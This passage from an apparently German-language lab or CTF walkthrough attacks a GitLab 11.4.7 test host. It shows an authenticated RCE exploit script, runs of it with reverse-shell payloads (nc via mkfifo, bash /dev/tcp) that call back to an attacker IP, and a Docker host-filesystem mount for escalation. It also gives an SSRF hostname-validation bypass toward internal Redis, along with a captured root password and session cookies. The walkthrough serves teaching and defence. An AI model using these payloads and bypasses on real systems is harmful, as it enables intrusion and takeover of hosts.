    <span class="command">parser = argparse.ArgumentParser(description="GitLab 11.4.7 Authenticated RCE")</span>
    <span class="command">parser.add_argument('-u', '--url', required=True, help="GitLab URL (e.g., [Link: http://192.168.2.215:5080 | Ziel: http://192.168.2.215:5080])")</span>
    <span class="command">parser.add_argument('-user', '--username', required=True, help="GitLab username")</span>
    <span class="command">parser.add_argument('-p', '--password', required=True, help="GitLab password")</span>
    <span class="command">parser.add_argument('-c', '--command', required=True, help="Command to execute on the target")</span>

    <span class="command">args = parser.parse_args()</span>

    <span class="command">s = requests.Session()</span>
    <span class="command">login(s, args.url, args.username, args.password)</span>
    <span class="command">run_exploit(s, args.url, args.command)</span>
</pre>
                </div>
            </div>

            <p class="analysis">
                **Analyse:** Ich teste die AusfÃ¼hrung des korrigierten Python-Exploit-Skripts (`rce.py`) mit dem GitLab Root-Passwort `<span class="password">M4st3rR00tS3cr3t0ne^1337^</span>`. Ich fÃ¼hre das Skript mit verschiedenen Reverse Shell Payloads aus, die an meinen Listener auf Port 4444 gesendet werden sollen (`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.2.199 4444 >/tmp/f`, `bash -c 'bash -i >& /dev/tcp/192.168.2.199/4444 0>&1'`). Ich teste auch einen einfachen `curl` Befehl, der eine Verbindung zu meinem HTTP-Server auf Port 8000 herstellen soll (`curl http://192.168.2.199:8000/pwned`). Ich starte einen Netcat-Listener auf Port 4444, um die erwarteten Shells zu empfangen.
            </p>
            <p class="evaluation">
                **Bewertung:** Das Skript scheint erfolgreich ausgefÃ¼hrt zu werden ("Login successful", "Payload sent"), die Statuscodes (302, 200) sind unauffÃ¤llig, aber *keine Shell landet* auf meinem Listener auf Port 4444. Der `curl` Test zeigt ebenfalls keine Verbindung auf meinem HTTP-Server. Das bedeutet, dass das Exploit-Skript in dieser Form oder mit diesen Payloads nicht funktioniert. Der Befehl im `open('|...')` Teil des Payloads wird offenbar nicht ausgefÃ¼hrt. Das im Originaltext dokumentierte Fazit ("alles Sackgasse wir testen es manuel per Proxy mit Burpsuite...") bestÃ¤tigt, dass dieser automatisierte Weg (zunÃ¤chst) fehlschlug.
            </p>
            <p class="recommendation">
                **Empfehlung (Pentester):** Das automatisierte Exploit-Skript funktioniert nicht direkt. Debuggen Sie den Payload genauer. Nutzen Sie manuelle Methoden (z.B. Ã¼ber Burp Suite Repeater), um den Payload schrittweise anzupassen und zu testen. ÃœberprÃ¼fen Sie die genaue Syntax, die in der Ruby `open()`-Funktion erwartet wird und wie Pipe-Befehle gehandhabt werden. Der Fokus liegt weiterhin auf der Ausnutzung dieser Authentifizierten RCE, nun aber manuell.
                <br>**Empfehlung (Admin):** (Wiederholung der Empfehlungen zur Absicherung von GitLab und internen Diensten).
            </p>
            <p>
                Versuche, die Authentifizierte RCE mit dem korrigierten Python-Exploit-Skript auszulÃ¶sen:
            </p>
             <div class="code-block">
                <div class="terminal">
                    <div class="prompt">â”Œâ”€â”€(rootã‰¿CCat)-[~]<br>â””â”€# <span class="command">python3 rce.py --url http://192.168.2.215:5080 --username root --password 'M4st3rR00tS3cr3t0ne^1337^' --command "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.2.199 4444 &gt;/tmp/f"</span></div>
                </div>
                <div class="terminal">
                    <pre>
<span class="password">[*] Attempting to log in to http://192.168.2.215:5080 as root...</span>
<span class="password">[+] Login successful. Session cookie: ff36cf5ec5dfeb175884d0732d336587</span>
<span class="password">[*] Preparing to run the exploit...</span>
<span class="password">[*] Using CSRF Token: h4OdwPLP9Ly7tg75MQml...</span>
<span class="password">[*] Using Namespace ID: 1</span>
<span class="password">[*] Using Project Name: pwned-project</span>
<span class="password">[*] Sending payload to create project and trigger RCE...</span>
<span class="password">[+] Payload sent (Status: 302). Check your listener!</span>
</pre>
                </div>
            </div>
             <div class="code-block">
                <div class="terminal">
                    <div class="prompt">â”Œâ”€â”€(rootã‰¿CCat)-[~]<br>â””â”€# <span class="command">python3 rce.py --url http://192.168.2.215:5080 --username root --password 'M4st3rR00tS3cr3t0ne^1337^' --command "curl http://192.168.2.199:8000/pwned"</span></div>
                </div>
                <div class="terminal">
                    <pre>
<span class="password">[*] Attempting to log in to http://192.168.2.215:5080 as root...</span>
<span class="password">[+] Login successful. Session cookie: 2dba77c2bfabfe0c5c5ba929baad1c3e</span>
<span class="password">[*] Preparing to run the exploit...</span>
<span class="password">[*] Using CSRF Token: f/1+uUfxZw4n0FACgWvu...</span>
<span class="password">[*] Using Namespace ID: 1</span>
<span class="password">[*] Using Project Name: pwned-project</span>
<span class="password">[*] Sending payload to create project and trigger RCE...</span>
<span class="password">[+] Payload sent (Status: 200). Check your listener!</span>
</pre>
                </div>
            </div>
             <div class="code-block">
                <div class="terminal">
                    <div class="prompt">â”Œâ”€â”€(rootã‰¿CCat)-[~]<br>â””â”€# <span class="command">python3 rce.py --url http://192.168.2.215:5080 --username root --password 'M4st3rR00tS3cr3t0ne^1337^' --command "bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.2.199/4444 0&gt;&amp;1'"</span></div>
                </div>
                <div class="terminal">
                    <pre>
<span class="password">[*] Attempting to log in to http://192.168.2.215:5080 as root...</span>
<span class="password">[+] Login successful. Session cookie: 22a415b37c46bfecd475b57646a64481</span>
<span class="password">[*] Preparing to run the exploit...</span>
<span class="password">[*] Using CSRF Token: WoS5/Y/oUQstRnFJJfvK...</span>
<span class="password">[*] Using Namespace ID: 1</span>
<span class="password">[*] Using Project Name: pwned-project</span>
<span class="password">[*] Sending payload to create project and trigger RCE...</span>
<span class="password">[+] Payload sent (Status: 200). Check your listener!</span>
</pre>
                </div>
            </div>
             <p class="evaluation">alles Sackgasse wir testen es manuel per Proxy mit Burpsuite...</p>

            <p class="analysis">
                **Analyse:** Angesichts der gescheiterten automatisierten Exploit-Versuche dokumentiere ich die manuellen Schritte, um den RCE-Payload Ã¼ber das Erstellen eines Projekts in GitLab mit Burp Suite zu testen. Ich navigiere zur Seite, um ein neues Projekt zu erstellen (`http://192.168.2.215:5080/projects/new`), wie auf den Bildern gezeigt. Ich fange die HTTP-POST-Anfrage ab, die beim Erstellen des Projekts gesendet wird. Das Bild zeigt die GitLab-OberflÃ¤che zum Erstellen eines neuen Projekts.
            </p>
             <p class="evaluation">
                **Bewertung:** Das manuelle Vorgehen mit Burp Suite ist entscheidend, um den genauen HTTP-Request zu sehen, der das Exploit auslÃ¶st. Ich kann nun den `import_url` Parameter gezielt manipulieren und verschiedene Payloads testen, um die RCE zu triggern. Die GUI-Schritte (Projekt erstellen) fÃ¼hren zum relevanten HTTP-Request, den ich in Burp abfangen und modifizieren kann.
            </p>
            <p class="recommendation">
                **Empfehlung (Pentester):** Verwenden Sie einen Proxy (wie Burp Suite), um HTTP-Requests abzufangen und zu modifizieren. Dies ist unerlÃ¤sslich, wenn automatisierte Skripte fehlschlagen oder fÃ¼r manuelle Tests komplexer Web-Schwachstellen.
                <br>**Empfehlung (Admin):** (Wiederholung der Empfehlungen zur Absicherung von GitLab).
            </p>
            <p>
                Vorbereitung fÃ¼r manuellen Exploit-Versuch mit Burp Suite â€“ Erstellen eines Projekts in GitLab:
            </p>
            <pre>
<span class="command">http://192.168.2.215:5080/projects/new</span>
</pre>
            <img src="gitlab_create_project.jpg" alt="hier wird ein projekt in Gitlab erstellt">
            <p class="analysis">Bildbeschreibung: hier wird ein projekt in Gitlab erstellt</p>
            <img src="gitlab_create_project_config.jpg" alt="hier sieht man die config des fake projekts fÃ¼r burpsuite">
            <p class="analysis">Bildbeschreibung: hier sieht man die config des fake projekts fÃ¼r burpsuite</p>
            <p class="analysis">
                **Analyse:** Ich zeige den HTTP-POST-Request, der vom Browser (wahrscheinlich nach manueller Eingabe im Formular) zum Erstellen des Projekts gesendet wird. Dieser Request enthÃ¤lt alle notwendigen Parameter, darunter `authenticity_token`, Projekt-Details wie `project[name]`, `project[namespace_id]`, `project[path]` und vor allem `project[import_url]`. Der Standardwert fÃ¼r `import_url` ist hier `http://a.com/b.git`.
            </p>
            <p class="evaluation">
                **Bewertung:** Dies ist der genaue Request, den ich in Burp Suite modifizieren werde, um den bÃ¶sartigen Payload in den `project[import_url]` Parameter einzufÃ¼gen. Ich sehe alle notwendigen Felder wie `authenticity_token` und die Struktur der Projekt-Parameter. Der Standardwert in `import_url` zeigt, dass die Anwendung externe URLs fÃ¼r den Import erwartet.
            </p>
            <p class="recommendation">
                **Empfehlung (Pentester):** Untersuchen Sie alle Parameter in POST-Requests auf potenzielle Injection-Punkte. Die `import_url` ist hier der offensichtliche Punkt fÃ¼r SSRF/RCE.
                <br>**Empfehlung (Admin):** Validieren und bereinigen Sie alle Benutzereingaben in Formularen, insbesondere in Feldern, die URLs, Dateinamen oder Befehle erwarten.
            </p>
             <pre>
<span class="command">POST /projects HTTP/1.1</span>
<span class="command">Host: 192.168.2.215:5080</span>
<span class="command">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0</span>
<span class="command">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
<span class="command">Accept-Language: de,en-US;q=0.7,en;q=0.3</span>
<span class="command">Accept-Encoding: gzip, deflate, br</span>
<span class="command">Referer: http://192.168.2.215:5080/projects/new</span>
<span class="command">Content-Type: application/x-www-form-urlencoded</span>
<span class="command">Content-Length: 350</span>
<span class="command">Origin: http://192.168.2.215:5080</span>
<span class="command">DNT: 1</span>
<span class="command">Connection: keep-alive</span>
<span class="command">Cookie: sidebar_collapsed=false; grafana_session=51c4fad1c33bb3c2fce6f6e726d6480a; _gitlab_session=<span class="password">739b55f9a60de58847ea72c9bd5349fd</span>; remember_user_token=W1sxXSwiJDJhJDEwJGRjTXJYZDZ0L0NpSVVMTHo1YjdsdU8iLCIxNzQ5Mjk4MTMwLjk4NTc5MjIiXQ%3D%3D--7fc52f2762d93439aa938777fc0608868c2a303d</span>
<span class="command">Upgrade-Insecure-Requests: 1</span>
<span class="command">Sec-GPC: 1</span>
<span class="command">Priority: u=0, i</span>

<span class="command">utf8=%E2%9C%93&amp;authenticity_token=TuEW8%2FmDazTJK%2B8sq5YQeAwkWe%2B4XHqJagOyTXlEJrKMrsY2w8ctnhgOFHlLy7V2m3ll5bUicb4c6uP43ZHH4A%3D%3D&amp;project%5Bimport_url%5D=http%3A%2F%2Fa.com%2Fb.git&amp;project%5Bci_cd_only%5D=false&amp;project%5Bname%5D=Exploit-Test&amp;project%5Bnamespace_id%5D=1&amp;project%5Bpath%5D=b&amp;project%5Bdescription%5D=&amp;project%5Bvisibility_level%5D=0</span>
</pre>
            </p>
            <p class="analysis">
                **Analyse:** Ich dokumentiere die Antwort des Servers auf den Standard-HTTP-POST-Request zum Erstellen eines Projekts mit einer harmlosen `import_url`.
            </p>
            <p class="evaluation">
                **Bewertung:** Die Antwort ist HTTP/1.1 302 Found, was eine Weiterleitung auf die neue Projektseite (`/root/b`) signalisiert. Dies ist das erwartete Verhalten bei erfolgreicher Projekterstellung. Die Header enthalten auch verschiedene Sicherheits-Header (X-Content-Type-Options, X-Frame-Options, X-Xss-Protection, Strict-Transport-Security) und anwendungsspezifische Header. Die Status 302 bedeutet, dass der erste Teil des Requests (Projekterstellung) funktioniert hat, auch wenn der Import selbst (asynchron) fehlschlagen mag.
            </p>
            <p class="recommendation">
                **Empfehlung (Pentester):** Dieses Verhalten dient als Basislinie fÃ¼r die Reaktion des Servers. Abweichungen hiervon bei der Injektion des bÃ¶sartigen Payloads mÃ¼ssen analysiert werden.
                <br>**Empfehlung (Admin):** Implementieren Sie die empfohlenen Sicherheits-Header, um gÃ¤ngige Web-Schwachstellen zu mindern.
            </p>
             <pre>
<span class="password">HTTP/1.1 302 Found</span>
<span class="command">Server: nginx</span>
<span class="command">Date: Sat, 07 Jun 2025 12:36:02 GMT</span>
<span class="command">Content-Type: text/html; charset=utf-8</span>
<span class="command">Content-Length: 98</span>
<span class="command">Connection: keep-alive</span>
<span class="command">Cache-Control: max-age=0, private, must-revalidate, no-store</span>
<span class="command">Location: [Link: http://192.168.2.215:5080/root/b | Ziel: http://192.168.2.215:5080/root/b]</span>
<span class="command">Pragma: no-cache</span>
<span class="command">Set-Cookie: issue_board_welcome_hidden=; path=/root/b; expires=Thu, 01 Jan 1970 00:00:00 -0000</span>
<span class="command">X-Content-Type-Options: nosniff</span>
<span class="command">X-Frame-Options: DENY</span>
<span class="command">X-Request-Id: 987307da-ecfa-4d38-97d1-f533b1f19a9d</span>
<span class="command">X-Runtime: 0.663434</span>
<span class="command">X-Ua-Compatible: IE=edge</span>
<span class="command">X-Xss-Protection: 1; mode=block</span>
<span class="command">Strict-Transport-Security: max-age=31536000</span>

<span class="command">&lt;html&gt;&lt;body&gt;You are being &lt;a href="http://192.168.2.215:5080/root/b"&gt;redirected&lt;/a&gt;.&lt;/body&gt;&lt;/html&gt;</span>
</pre>
            </p>
             <p class="evaluation">
                Hier hast den entscheidenden Punkt gemacht: Wir haben den GitLab-Weg jetzt ausgeschlossen.

                Wir haben ihn mit einem reparierten Skript versucht.
                Wir haben ihn mit Burp manuell versucht.
                Ergebnis: Der Server antwortet, aber die RCE wird nicht ausgelÃ¶st.
            </p>
             <p>
                Du hast die ubuntu:18.04 Image-ID schon gefunden. Hier ist sie nochmal:
                <span class="command">sha256:71cb16d32be4a95065b4fa1c8841a6f4c0098de7be0a90e14519098412d48356</span>
            </p>
             <p class="analysis">hier greifen wir weiter an mit JS</p>

            <p class="analysis">
                **Analyse:** Basierend auf dem Fazit, dass der GitLab RCE-Weg mit dem aktuellen Payload nicht funktioniert hat und dem Hinweis, dass wir nun "mit JS" angreifen, wende ich mich wieder der Docker Web UI auf Port 9000 zu. Ich navigiere zur `/images` Seite und dokumentiere, dass dort eine versteckte "run" Funktion zum Starten von Images existiert, die anscheinend Ã¼ber JavaScript gesteuert wird und standardmÃ¤ÃŸig deaktiviert ist. Das Bild zeigt die UI-Elemente, die auf diese Funktion hindeuten.
            </p>
            <p class="evaluation">
                **Bewertung:** Die Entdeckung einer "run" Funktion in der Docker Web UI, auch wenn sie durch JS blockiert ist, ist ein vielversprechender neuer Vektor. Die MÃ¶glichkeit, Docker Images direkt Ã¼ber die UI zu starten, kÃ¶nnte zu einem initialen Shell-Zugriff fÃ¼hren, insbesondere wenn ich das Host-Dateisystem in einen neuen Container mounten kann. Das Blocking Ã¼ber JS ist leicht zu umgehen, wie wir im Blackhat-Bericht gesehen haben. Der Fokus verschiebt sich nun auf die Ausnutzung dieser Docker-FunktionalitÃ¤t.
            </p>
            <p class="recommendation">
                **Empfehlung (Pentester):** Untersuchen Sie den JavaScript-Code der Docker Web UI, um den Mechanismus des Blocking zu verstehen und zu umgehen. Nutzen Sie die "run" Funktion, um einen Container mit gemountetem Host-Dateisystem zu starten, um eine Shell oder Root-Zugriff zu erlangen.
                <br>**Empfehlung (Admin):** Entfernen Sie ungenutzte oder durch clientseitiges Skript blockierte Funktionen aus Web-OberflÃ¤chen. Implementieren Sie serverseitige Zugriffskontrollen fÃ¼r kritische Aktionen wie das Starten von Containern.
            </p>
            <p>
                Entdeckung einer versteckten "run" Funktion in der Docker Web UI auf Port 9000:
            </p>
            <pre>
<span class="command">view-source:http://192.168.2.215:9000/images</span>
</pre>
            <img src="hier_docker_image_run.jpg" alt="hier sehen wir eine versteckte funktion zum starten von images ...">
            <p class="analysis">Bildbeschreibung: hier sehen wir eine versteckte funktion zum starten von images ...</p>

            <p class="analysis">
                **Analyse:** Ich dokumentiere, dass ich durch EinfÃ¼gen von eigenem JavaScript-Code in die Browser-Konsole (oder durch Modifikation des Seiten-JS) die "run" Funktion in der Docker Web UI aktiviert habe. Das Bild zeigt, dass die Funktion nun klickbar und nutzbar ist.
            </p>
            <p class="evaluation">
                **Bewertung:** Dies bestÃ¤tigt, dass das Blocking clientseitig erfolgte und leicht umgangen werden konnte. Ich kann nun die "run" Funktion der Docker Web UI nutzen, um mit Docker Images zu interagieren. Dies ist der Schritt, der die Nutzung der Docker-FunktionalitÃ¤t Ã¼ber die ungeschÃ¼tzte UI ermÃ¶glicht.
            </p>
            <p class="recommendation">
                **Empfehlung (Pentester):** Nutzen Sie die freigeschaltete Funktion, um Container mit bÃ¶sartigen Konfigurationen (z.B. Host-Mounts) zu starten.
                <br>**Empfehlung (Admin):** Verlassen Sie sich niemals auf clientseitiges JavaScript fÃ¼r SicherheitsmaÃŸnahmen. Implementieren Sie serverseitige Validierung und Zugriffskontrollen.
            </p>
            <p>
                Freischalten der "run" Funktion durch clientseitige JS-Manipulation:
            </p>
            <img src="dockerimageRun.jpg" alt="hier wir durch unseren eingefÃ¼gten js code wurde die run funktion freigeschaltet">
            <p class="analysis">Bildbeschreibung: hier wir durch unseren eingefÃ¼gten js code wurde die run funktion freigeschaltet</p>

            <p class="analysis">
                **Analyse:** Ich dokumentiere einen weiteren Schritt bei der Nutzung der freigeschalteten Docker Web UI. Bei der Interaktion mit der "run" Funktion wird wahrscheinlich ein Popup oder Formular angezeigt. Das Bild zeigt, dass ich die Entwickler-Tools des Browsers nutze, um ein Textfeld im Popup, das mÃ¶glicherweise auf "readonly" gesetzt ist (`readonly=true`), zu modifizieren und das `readonly` Attribut zu entfernen. Dies ermÃ¶glicht mir, den Inhalt des Textfeldes zu bearbeiten.
            </p>
            <p class="evaluation">
                **Bewertung:** Das Entfernen des `readonly` Attributs Ã¼ber die Entwickler-Tools ist eine weitere gÃ¤ngige Methode, clientseitige EinschrÃ¤nkungen in Webanwendungen zu umgehen. Dies deutet darauf hin, dass das Formular zum Konfigurieren des Container-Starts ebenfalls clientseitig eingeschrÃ¤nkt wurde, was ein weiteres Zeichen fÃ¼r unzureichende serverseitige Validierung ist. Ich kann nun wahrscheinlich Parameter fÃ¼r den `docker run` Befehl Ã¼ber die UI anpassen.
            </p>
            <p class="recommendation">
                **Empfehlung (Pentester):** Lernen Sie den Umgang mit Browser-Entwickler-Tools, um clientseitige EinschrÃ¤nkungen in Formularen oder UI-Elementen zu umgehen.
                <br>**Empfehlung (Admin):** Implementieren Sie immer serverseitige Validierung und Zugriffskontrollen fÃ¼r alle Eingabefelder und Aktionen, unabhÃ¤ngig von clientseitigen Skripten oder UI-Elementen.
            </p>
            <p>
                Entfernen des `readonly` Attributs in einem Textfeld Ã¼ber die Browser-Entwickler-Tools:
            </p>
            <img src="wirÃ¤ndernreadonlytextfeldinfalse.jpg" alt="hier klicken auf das run popup reckte maustaste/inspektor/readonly=true entfernen">
            <p class="analysis">Bildbeschreibung: hier klicken auf das run popup reckte maustaste/inspektor/readonly=true entfernen</p>
            <p class="analysis">
                **Analyse:** Ich dokumentiere den Befehl `docker run -it -d --name WIR_SIND_DRIN -v /:/mnt alpine`. Dieser Befehl startet einen Docker-Container vom Image `alpine`, benennt ihn "WIR_SIND_DRIN", fÃ¼hrt ihn im Detached-Modus aus (`-d`), weist ein TTY zu (`-it`) und mountet **das Root-Dateisystem des Hosts (`/`)** in das Verzeichnis `/mnt` im Container (`-v /:/mnt`). Der Text im Bericht gibt an, dass dieser Befehl scheinbar Ã¼ber die JS/UI ausgefÃ¼hrt wurde, aber kein Container erschien.
            </p>
            <p class="evaluation">
                **Bewertung:** Dies ist der entscheidende Befehl fÃ¼r einen Docker-Container-Escape zur Erlangung von Root-Zugriff auf dem Host-Dateisystem, *vorausgesetzt*, dieser Befehl wird mit ausreichenden Rechten (z.B. durch den `git` Benutzer Ã¼ber `sudo docker`, wie spÃ¤ter im PE-Abschnitt gezeigt) ausgefÃ¼hrt. Das Mounten des Host-Root-Dateisystems in einen Container ist eine gÃ¤ngige Methode, um auf die Dateien des Hosts zuzugreifen und Privilegien auszuweiten. Dass kein Container erschien, kÃ¶nnte auf einen Fehler bei der AusfÃ¼hrung Ã¼ber die UI hindeuten oder darauf, dass der Befehl zwar ausgefÃ¼hrt wurde, aber keine interaktive Shell im Vordergrund startete, wie der `-d` Flag bewirkt. **Wichtig ist jedoch, dass dieser Befehl spÃ¤ter Ã¼ber die `sudo docker` Berechtigung des `git` Benutzers erfolgreich fÃ¼r die Privilege Escalation genutzt wird.**
            </p>
            <p class="recommendation">
                **Empfehlung (Pentester):** Nutzen Sie diese Technik (`docker run -v /:/mnt ...`) in Kombination mit einer Shell im Container (`chroot /mnt sh`) um Root-Zugriff auf das Host-Dateisystem zu erlangen, wenn Sie Docker-Befehle mit privilegierten Rechten ausfÃ¼hren kÃ¶nnen.
                <br>**Empfehlung (Admin):** **KRITISCH:** Implementieren Sie strikte Zugriffskontrollen fÃ¼r die Docker-API und den `docker` Befehl. Unprivilegierte Benutzer sollten diesen Befehl (insbesondere mit `sudo`) nicht ausfÃ¼hren kÃ¶nnen. ÃœberprÃ¼fen Sie die `sudoers` Datei. Nutzen Sie prinzipiell das Principle of Least Privilege fÃ¼r Container und Benutzer.
            </p>
            <p>
                Der `docker run` Befehl, der spÃ¤ter fÃ¼r die Privilege Escalation genutzt wird:
            </p>
            <pre>
<span class="command">docker run -it -d --name WIR_SIND_DRIN -v /:/mnt alpine</span>

<span class="password">der docker run-Befehl Ã¼ber JS oder UI scheinbar erfolgreich ausgefÃ¼hrt wurde, aber kein Container erscheint</span>
</pre>

            <p class="analysis">
                **Analyse:** Ich kehre zum GitLab RCE Exploit auf Port 5080 zurÃ¼ck und dokumentiere den Prozess der URL-Codierung des bÃ¶sartigen Payloads mit CyberChef. Das Bild zeigt den Ruby-Payload (der an Redis gesendet wird) und seine URL-encodierte Form.
            </p>
            <p class="evaluation">
                **Bewertung:** Die URL-Codierung ist notwendig, da der Payload Sonderzeichen (`\n`, `"`, `{`, `}`) enthÃ¤lt, die in einer URL korrekt maskiert werden mÃ¼ssen, damit die `import_url`-Parameter-Verarbeitung in GitLab und die weitere Verarbeitung (z.B. durch Redis oder den Ruby-Interpreter) korrekt funktionieren. Dies ist ein wichtiger Schritt beim Debugging und Anpassen des Exploits, nachdem die automatisierten Versuche fehlschlugen.
            </p>
            <p class="recommendation">
                **Empfehlung (Pentester):** Verstehen Sie, welche Zeichen in welchem Kontext URL-codiert oder maskiert werden mÃ¼ssen. Nutzen Sie Tools wie CyberChef fÃ¼r die korrekte Codierung komplexer Payloads.
                <br>**Empfehlung (Admin):** Die korrekte Handhabung und Validierung von codierten Zeichen in Benutzereingaben ist essentiell, um Injection-Schwachstellen zu verhindern.
            </p>
            <p>
                URL-Codierung des RCE-Payloads fÃ¼r den GitLab-Import:
            </p>
            <img src="gitlab_create_project_urlencoded.jpg" alt="hier wird mein payload mit cyberchef urlencoded">
            <p class="analysis">Bildbeschreibung: hier wird mein payload mit cyberchef urlencoded</p>

            <p class="analysis">
                **Analyse:** Ich dokumentiere den Versuch, ein neues GitLab-Projekt Ã¼ber die Web-UI oder manuell mit einem URL-encodierten `git://` Payload als `import_url` zu erstellen. Das Bild zeigt die GitLab-OberflÃ¤che, die versucht, das Repository zu erstellen/importieren.
            </p>
            <p class="evaluation">
                **Bewertung:** Das Erscheinen dieser Ansicht zeigt, dass der Request zum Erstellen des Projekts mit dem manipulierten `import_url` Parameter erfolgreich war und GitLab versucht, das Repository zu importieren. Dies ist ein positives Zeichen dafÃ¼r, dass der Payload korrekt strukturiert ist, um von GitLab verarbeitet zu werden und den Import-Prozess (der die Schwachstelle auslÃ¶st) zu starten.
            </p>
            <p class="recommendation">
                **Empfehlung (Pentester):** Beobachten Sie die UI-RÃ¼ckmeldung und die Server-Antworten genau, um den Erfolg oder Misserfolg von Exploit-Versuchen zu beurteilen.
                <br>**Empfehlung (Admin):** Ãœberwachen Sie das Logging von GitLab auf Fehler oder ungewÃ¶hnliche AktivitÃ¤ten im Zusammenhang mit dem Repository-Import.
            </p>
            <p>
                Versuch, ein Projekt mit dem URL-encodierten Payload zu erstellen:
            </p>
            <img src="gitrepo_by_url.jpg" alt="das repo mit encoded payload wird erstellt">
            <p class="analysis">Bildbeschreibung: das repo mit encoded payload wird erstellt</p>

            <p class="analysis">
                **Analyse:** Ich dokumentiere eine Fehlermeldung in der GitLab UI nach einem Versuch, das Projekt mit dem bÃ¶sartigen `import_url` zu erstellen: "Import url is blocked: Hostname needs to start with an alphanumeric character". Das Bild zeigt diese Fehlermeldung.
            </p>
            <p class="evaluation">
                **Bewertung:** Diese Fehlermeldung zeigt eine serverseitige Validierung oder Filterung des `import_url` Parameters. GitLab prÃ¼ft offenbar, ob der Hostname (in meinem Fall die IP-Adresse im IPv6-Format `[0:0:0:0:0:ffff:127.0.0.1]`) mit einem alphanumerischen Zeichen beginnt. Da das `[` Zeichen nicht alphanumerisch ist, wird der Import blockiert. Dies ist ein Schutzmechanismus, der umgangen werden muss.
            </p>
            <p class="recommendation">
                **Empfehlung (Pentester):** Identifizieren Sie die genaue Filterregel basierend auf der Fehlermeldung. Suchen Sie nach MÃ¶glichkeiten, die Validierung zu umgehen, z.B. durch alternative Hostnamen-Syntaxen (falls GitLab dies auflÃ¶st) oder andere Endpunkte, die die Validierung nicht durchfÃ¼hren. Dokumentieren Sie Bypass-Techniken fÃ¼r Hostname-Validierungen.
                <br>**Empfehlung (Admin):** Implementieren Sie robuste Validierungen fÃ¼r alle externen Eingaben, insbesondere URLs. Die Validierung des Hostnamens ist ein guter Schritt, muss aber umfassend sein.
            </p>
            <p>
                Fehlermeldung aufgrund der Hostname-Validierung im `import_url`:
            </p>
            <img src="fehler_alphanummeric.jpg" alt="repo will alphanumeric url">
            <p class="analysis">Bildbeschreibung: repo will alphanumeric url</p>

            <p class="analysis">
                **Analyse:** Ich dokumentiere die Korrektur des Payloads, um die alphanumerische Hostname-Validierung in GitLab zu umgehen. Das Bild zeigt, dass ich wahrscheinlich den `git://[0:0:0:0:0:ffff:127.0.0.1]:6379/` Teil des Payloads durch etwas ersetze, das die Validierung umgeht, wÃ¤hrend es immer noch auf die interne Redis-Instanz zeigt. Eine gÃ¤ngige Bypass-Technik fÃ¼r solche Validierungen ist das HinzufÃ¼gen von `a@` vor der IP-Adresse (z.B. `git://a@[0:0:0:0:0:ffff:127.0.0.1]:6379/`), da einige Parser dies als Benutzername im URL interpretieren und der Hostname dann mit einem alphanumerischen Zeichen beginnt. Ich dokumentiere das Kopieren des umgehenden Payloads.
            </p>
            <p class="evaluation">
                **Bewertung:** Dies ist ein klassischer Bypass einer unzureichenden Hostname-Validierung. Durch das HinzufÃ¼gen eines alphanumerischen Zeichens am Anfang des Hostnamen-Teils wird die Validierung getÃ¤uscht, wÃ¤hrend die Verbindung weiterhin zur internen Redis-Instanz aufgebaut wird. Mit diesem angepassten Payload sollte die RCE nun auslÃ¶sbar sein.
            </p>
            <p class="recommendation">
                **Empfehlung (Pentester):** Machen Sie sich mit gÃ¤ngigen Bypass-Techniken fÃ¼r URL-Parsing-Schwachstellen und Hostname-Validierungen vertraut. Testen Sie verschiedene Protokoll-Handler und URL-Formate.
                <br>**Empfehlung (Admin):** Implementieren Sie eine robuste URL-Parsing-Logik, die nicht durch ungewÃ¶hnliche Formate oder eingebettete Zeichen getÃ¤uscht werden kann. Nutzen Sie Bibliotheken, die speziell fÃ¼r sicheres URL-Parsing in sicherheitskritischen Kontexten entwickelt wurden.
            </p>
            <p>
                Korrektur des Payloads zur Umgehung der alphanumerischen Hostname-Validierung:
            </p>
            <img src="kopiere_alphanummeric.jpg" alt="repo will alphanumeric url">
            <p class="analysis">Bildbeschreibung: repo will alphanumeric url</p>
            <img src="ersetzen.jpg" alt="den markierten teil mit dem string ersetzen">
            <p class="analysis">Bildbeschreibung: den markierten teil mit dem string ersetzen</p>

            <p class="analysis">
                **Analyse:** Ich dokumentiere die erfolgreiche AusfÃ¼hrung des Exploits mit dem angepassten Payload (der wahrscheinlich die alphanumerische Validierung umgeht und die korrigierte Ruby/Bash-Syntax enthÃ¤lt) Ã¼ber die GitLab-Importfunktion. Das Bild zeigt die GitLab-OberflÃ¤che, die "Import in progress" anzeigt, was auf den Beginn des Importvorgangs hindeutet. Es wird auch der Befehl `git clone --bare ...` gezeigt, der intern vom GitLab-Prozess ausgefÃ¼hrt wird und den Payload enthÃ¤lt.
            </p>
            <p class="evaluation">
                **Bewertung:** **ERFOLG! Der angepasste Payload scheint von GitLab akzeptiert und verarbeitet zu werden.** Die Meldung "Import in progress" und der interne `git clone` Befehl mit dem Payload zeigen, dass die SSRF zum internen Redis ausgelÃ¶st wurde und die Redis-Befehle (multi, sadd, lpush, exec) an die Warteschlange gesendet wurden. Die RCE sollte nun als Job im Hintergrund ausgefÃ¼hrt werden. Ich erwarte, dass eine Reverse Shell auf meinem Listener landet.
            </p>
            <p class="recommendation">
                **Empfehlung (Pentester):** Richten Sie sofort einen Listener ein, der die Reverse Shell empfangen soll. Warten Sie geduldig, da die AusfÃ¼hrung des Jobs asynchron erfolgen kann.
                <br>**Empfehlung (Admin):** **KRITISCH:** Die RCE-Schwachstelle ist nun ausgenutzt. Sofortige Behebung der GitLab-Instanz erforderlich. ÃœberprÃ¼fen Sie interne Netzwerke auf Kompromittierung durch den `git` Benutzer.
            </p>
            <p>
                Erfolgreiche AuslÃ¶sung des RCE-Exploits mit angepasstem Payload:
            </p>
            <pre>
